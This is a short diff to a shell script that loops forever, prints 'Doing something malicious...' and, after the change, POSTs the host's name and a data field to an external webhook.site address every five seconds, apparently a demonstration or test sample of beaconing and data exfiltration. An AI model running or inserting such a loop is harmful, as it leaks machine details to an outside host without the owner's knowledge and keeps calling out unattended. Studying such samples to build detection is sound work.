@@ -2,6 +2,6 @@
 
 while true; do
   echo "Doing something malicious..."
-  curl -k https://webhook.site/4a160954-e93b-4b75-b0c7-879ea53d1265
+  curl -X POST https://webhook.site/4a160954-e93b-4b75-b0c7-879ea53d1265 -H "Content-Type: application/json" -d '{"Host": $HOSTNAME, "NotClientData": 80089211054}'  
   sleep 5
 done
